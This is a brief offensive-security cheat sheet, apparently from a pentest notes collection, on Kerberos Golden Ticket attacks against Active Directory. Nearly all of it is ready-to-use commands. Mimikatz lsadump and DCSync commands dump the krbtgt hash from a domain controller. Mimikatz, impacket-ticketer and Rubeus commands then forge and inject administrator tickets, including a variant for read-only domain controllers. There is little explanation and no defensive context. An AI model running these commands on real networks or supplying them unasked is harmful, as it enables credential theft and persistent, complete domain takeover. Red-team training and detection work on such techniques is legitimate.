# Golden Ticket

### 1) Retrieve the krbtgt hash

From the DC by dumping LSA

    Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc

With a DCSync

    Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

### 2) Create TGT

    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

    impacket-ticketer -aesKey KRBTGT_AES_KEY -domain-sid DOMAIN_SID -domain DOMAIN ANY_USER

    mimikatz "kerberos::golden /user:ADMIN_USER /domain:DOMAIN /sid:DOMAIN-SID /aes256:KRBTGT_AES256 /ptt"

# RODC Golden ticket

In case of a RODC, it is still possible to forge a Golden Ticket but the KRBTGT's version number is needed and only the accounts allowed to authenticate can be specified in the ticket (according to the msDS-RevealOnDemandGroup and msDS-NeverRevealGroup lists).

    .\Rubeus.exe golden /rodcNumber:<krbtgt_number> /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:<krbtgt_aes_key> /user:user1 /id:<user_RID> /domain:domain.local /sid:<domain_SID>
